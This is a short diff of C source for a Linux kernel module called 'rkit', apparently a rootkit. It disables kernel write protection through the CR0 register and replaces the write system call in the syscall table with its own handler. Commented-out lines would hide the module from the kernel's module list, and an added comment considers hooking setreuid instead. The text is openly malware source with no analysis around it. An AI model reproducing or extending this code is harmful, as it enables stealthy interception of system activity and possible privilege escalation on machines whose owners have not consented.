@@ -49,8 +49,8 @@ asmlinkage ssize_t rkit_write(int fd, const char __user *buff, ssize_t count) {
 }
 
 int rkit_init(void) {
-    // list_del_init(&__this_module.list);
-    // kobject_del(&THIS_MODULE->mkobj.kobj);
+    //list_del_init(&__this_module.list);
+    //kobject_del(&THIS_MODULE->mkobj.kobj);
 
     if ((sys_call_table = (psize *) find())) {
 	//same as printf except designed for use w/ kernel
@@ -61,6 +61,7 @@ int rkit_init(void) {
     }
 
     write_cr0(read_cr0() & (~ 0x10000));
+    //this is writiing to __NR_write, we might want to overwrite setreuid?
     o_write = (void *) xchg(&sys_call_table[__NR_write], (psize)rkit_write);
     write_cr0(read_cr0() | 0x10000);
 
